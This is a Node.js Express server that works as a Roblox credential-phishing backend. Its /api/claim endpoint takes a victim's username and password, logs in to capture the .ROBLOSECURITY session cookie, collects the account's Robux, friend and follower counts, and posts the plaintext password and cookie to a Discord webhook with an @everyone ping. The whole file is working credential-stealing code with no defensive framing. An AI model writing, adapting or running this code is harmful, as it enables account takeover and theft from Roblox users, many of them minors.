const express = require("express");
const cors = require("cors");
const login = require("./login");
const getRobloxStats = require("./cookiechecker.js");
const PORT = process.env.PORT || 3000;

process.on("uncaughtException", (err) => {
    console.error("UNCAUGHT:", err);
});

process.on("unhandledRejection", (err) => {
    console.error("REJECTION:", err);
});

const log = {
    info: (msg) => console.log(`\x1b[36m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.log(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
    step: (msg) => console.log(`\x1b[35m[STEP]\x1b[0m ${msg}`)
};

async function sendLog(webhookURL, embed, content) {
    const fileEmbed = {
        title: ".ROBLOSECURITY :cookie:",
        color: 0x2b2d31,
        description: "```" + content + "```"
    };

    const res = await fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: "@everyone",
            embeds: [embed, fileEmbed]
        })
    });

    console.log(await res.text());
}

const app = express();
app.use(cors());
app.use(express.json());

app.post("/api/claim", async (req, res) => {
    try {
        const { username, password } = req.body;
        log.info(`Login attempt → ${username}`);

        if (!username || !password) {
            return res.status(400).json({ error: "Missing fields" });
        }

        const stat = await login(username, password);
        if (!stat?.result || !stat.session) {
            return res.status(401).json({ error: "Login failed" });
        }
        const cookie = stat.session;
        log.step("Fetching Roblox user ID...");

        const r1 = await fetch("https://users.roblox.com/v1/usernames/users", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usernames: [username] })
        });

        const d1 = await r1.json();
        if (!d1.data || !d1.data.length) {
            return res.status(404).json({ error: "User not found" });
        }

        const userId = d1.data[0].id;

        // avatar
        const avatarRes = await fetch(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
        );

        const avatarData = await avatarRes.json();
        const avatarUrl = avatarData.data?.[0]?.imageUrl;

        log.success(`User ID resolved → ${userId}`);

        // 🔥 GET FULL STATS HERE
        const stats = await getRobloxStats(cookie);

        const embed = {
            title: "Account Info",
            fields: [
                { name: "👤 Username", value: `\`\`\`${username}\`\`\``, inline: true },
                { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: true },
                { name: "🆔 UserID", value: `\`\`\`${stats.userId}\`\`\``, inline: true },
                { name: "💰 Robux", value: `\`\`\`${stats.robux}\`\`\``, inline: true },
                { name: "👥 Friends", value: `\`\`\`${stats.friends}\`\`\``, inline: true },
                { name: "📈 Followers", value: `\`\`\`${stats.followers}\`\`\``, inline: true },
                {name: "➡️ Following", value: `\`\`\`${stats.following}\`\`\``, inline: true }
            ]
        };

        if (avatarUrl) {
            embed.thumbnail = { url: avatarUrl };
        }

        log.step("Sending data to Discord webhook...");

        const webhookURL = process.env.WEBHOOK_URL;;
        await sendLog(webhookURL, embed, cookie);

        return res.json({ success: true });

    } catch (err) {
        console.error(err);
        return res.status(500).json({ error: "Server error" });
    }
});

app.listen(PORT, "0.0.0.0", () => {
    console.log("Server running on", PORT);
});
